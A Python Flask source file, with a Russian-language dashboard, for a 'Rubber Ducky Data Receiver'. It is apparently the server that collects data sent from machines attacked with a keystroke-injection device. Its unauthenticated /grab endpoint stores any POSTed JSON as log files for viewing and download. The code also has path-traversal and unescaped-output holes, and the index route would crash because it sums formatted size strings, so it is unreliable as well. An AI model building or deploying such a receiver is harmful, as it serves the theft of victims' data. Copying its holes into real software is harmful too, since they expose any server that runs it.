from flask import Flask, request, jsonify, render_template_string
import json
import os
from datetime import datetime

app = Flask(__name__)

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ============================================================
# HTML ШАБЛОН (КРАСИВЫЙ САЙТ С КНОПКОЙ ЛОГОВ)
# ============================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ducky Server</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: #0a0a0f;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            width: 100%;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            backdrop-filter: blur(10px);
        }
        h1 {
            font-size: 36px;
            font-weight: 700;
            background: linear-gradient(135deg, #4ade80, #2a7fff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
            text-align: center;
        }
        .subtitle {
            text-align: center;
            color: rgba(255,255,255,0.4);
            font-size: 14px;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }
        .status {
            display: flex;
            align-items: center;
            gap: 12px;
            background: rgba(74, 222, 128, 0.08);
            border: 1px solid rgba(74, 222, 128, 0.15);
            border-radius: 12px;
            padding: 16px 20px;
            margin-bottom: 24px;
        }
        .status .dot {
            width: 12px;
            height: 12px;
            background: #4ade80;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }
        .status .text {
            font-size: 16px;
            font-weight: 500;
            color: rgba(255,255,255,0.9);
        }
        .status .text small {
            font-weight: 400;
            color: rgba(255,255,255,0.3);
            font-size: 13px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 16px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.04);
            border-radius: 12px;
            padding: 16px;
            text-align: center;
            transition: all 0.3s ease;
        }
        .stat-card:hover {
            background: rgba(255,255,255,0.06);
            border-color: rgba(255,255,255,0.08);
        }
        .stat-card .number {
            font-size: 28px;
            font-weight: 700;
            color: #4ade80;
        }
        .stat-card .label {
            font-size: 12px;
            color: rgba(255,255,255,0.3);
            margin-top: 4px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .btn-row {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
        .btn {
            flex: 1;
            min-width: 140px;
            padding: 14px 24px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .btn-primary {
            background: linear-gradient(135deg, #4ade80, #22c55e);
            color: #0a0a0f;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(74, 222, 128, 0.3);
        }
        .btn-secondary {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.08);
            color: #fff;
        }
        .btn-secondary:hover {
            background: rgba(255,255,255,0.08);
            transform: translateY(-2px);
        }
        .btn-danger {
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.2);
            color: #f87171;
        }
        .btn-danger:hover {
            background: rgba(239, 68, 68, 0.25);
            transform: translateY(-2px);
        }
        .logs-section {
            margin-top: 30px;
            border-top: 1px solid rgba(255,255,255,0.04);
            padding-top: 24px;
        }
        .logs-section .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }
        .logs-section .header h2 {
            font-size: 18px;
            font-weight: 600;
            color: rgba(255,255,255,0.8);
        }
        .logs-section .header .count {
            font-size: 13px;
            color: rgba(255,255,255,0.3);
        }
        .log-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 16px;
            background: rgba(255,255,255,0.02);
            border-radius: 8px;
            margin-bottom: 4px;
            transition: all 0.2s ease;
            border: 1px solid transparent;
        }
        .log-item:hover {
            background: rgba(255,255,255,0.04);
            border-color: rgba(255,255,255,0.04);
        }
        .log-item .name {
            font-size: 13px;
            color: rgba(255,255,255,0.7);
            font-family: monospace;
        }
        .log-item .size {
            font-size: 12px;
            color: rgba(255,255,255,0.3);
        }
        .log-item .actions {
            display: flex;
            gap: 8px;
        }
        .log-item .actions a {
            color: rgba(255,255,255,0.3);
            text-decoration: none;
            font-size: 13px;
            transition: color 0.2s;
            padding: 2px 8px;
            border-radius: 4px;
        }
        .log-item .actions a:hover {
            color: #4ade80;
            background: rgba(74, 222, 128, 0.08);
        }
        .log-item .actions a.danger:hover {
            color: #f87171;
            background: rgba(239, 68, 68, 0.08);
        }
        .empty {
            text-align: center;
            padding: 40px 0;
            color: rgba(255,255,255,0.2);
            font-size: 14px;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: rgba(255,255,255,0.15);
            letter-spacing: 0.5px;
        }
        @media (max-width: 600px) {
            .container { padding: 24px; }
            .stats { grid-template-columns: 1fr 1fr; }
            .btn-row { flex-direction: column; }
            .btn { min-width: auto; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🪐 Ducky Server</h1>
        <div class="subtitle">Rubber Ducky Data Receiver</div>

        <div class="status">
            <span class="dot"></span>
            <span class="text">Сервер активен <small>— принимает POST-запросы на /grab</small></span>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="number">{{ files|length }}</div>
                <div class="label">Получено файлов</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ total_size }}</div>
                <div class="label">Всего данных</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ last_file or '-' }}</div>
                <div class="label">Последний</div>
            </div>
        </div>

        <div class="btn-row">
            <a href="/logs/" class="btn btn-primary">📂 Открыть логи</a>
            <button onclick="window.location.reload()" class="btn btn-secondary">🔄 Обновить</button>
            <button onclick="if(confirm('Удалить все логи?')){fetch('/clear',{method:'POST'}).then(()=>location.reload())}" class="btn btn-danger">🗑️ Очистить</button>
        </div>

        <div class="logs-section">
            <div class="header">
                <h2>📄 Последние логи</h2>
                <span class="count">{{ files|length }} файлов</span>
            </div>
            {% if files %}
                {% for file in files[:10] %}
                <div class="log-item">
                    <span class="name">{{ file.name }}</span>
                    <span class="size">{{ file.size }}</span>
                    <div class="actions">
                        <a href="/logs/{{ file.name }}">👁️</a>
                        <a href="/logs/{{ file.name }}" download class="danger">⬇️</a>
                        <a href="/delete/{{ file.name }}" class="danger" onclick="return confirm('Удалить?')">✕</a>
                    </div>
                </div>
                {% endfor %}
            {% else %}
                <div class="empty">Нет полученных данных. Вставьте Rubber Ducky.</div>
            {% endif %}
        </div>

        <div class="footer">⚡ Render • Flask • Ducky Data Receiver</div>
    </div>
</body>
</html>
"""

# ============================================================
# МАРШРУТЫ
# ============================================================

@app.route('/')
def index():
    files = get_logs_info()
    total_size = format_size(sum(f['size'] for f in files))
    last_file = files[0]['name'] if files else None

    return render_template_string(
        HTML_TEMPLATE,
        files=files[:10],
        total_size=total_size,
        last_file=last_file
    )

@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data"}), 400

        filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(LOG_DIR, filename)

        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        print(f"[+] Получены данные: {filename}")
        return jsonify({"status": "OK", "file": filename}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/logs/')
def list_logs():
    files = get_logs_info()
    html = "<h1>📁 Логи</h1><ul>"
    for f in files:
        html += f'<li><a href="/logs/{f["name"]}">{f["name"]}</a> ({f["size"]})</li>'
    html += "</ul>"
    return html

@app.route('/logs/<filename>')
def view_log(filename):
    filepath = os.path.join(LOG_DIR, filename)
    if not os.path.exists(filepath):
        return "File not found", 404

    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()

    try:
        data = json.loads(content)
        formatted = json.dumps(data, indent=2, ensure_ascii=False)
    except:
        formatted = content

    return f"<pre style='font-family:monospace;padding:20px;background:#0a0a0f;color:#4ade80;min-height:100vh;'>{formatted}</pre>"

@app.route('/delete/<filename>', methods=['GET', 'POST'])
def delete_log(filename):
    filepath = os.path.join(LOG_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
    return jsonify({"status": "deleted"})

@app.route('/clear', methods=['POST'])
def clear_logs():
    for f in os.listdir(LOG_DIR):
        os.remove(os.path.join(LOG_DIR, f))
    return jsonify({"status": "cleared"})

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================

def get_logs_info():
    files = []
    for f in os.listdir(LOG_DIR):
        if f.endswith('.json'):
            path = os.path.join(LOG_DIR, f)
            size = os.path.getsize(path)
            files.append({
                'name': f,
                'size': format_size(size),
                'size_bytes': size
            })
    files.sort(key=lambda x: x['size_bytes'], reverse=True)
    return files

def format_size(bytes):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes < 1024:
            return f"{bytes:.1f} {unit}"
        bytes /= 1024
    return f"{bytes:.1f} TB"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
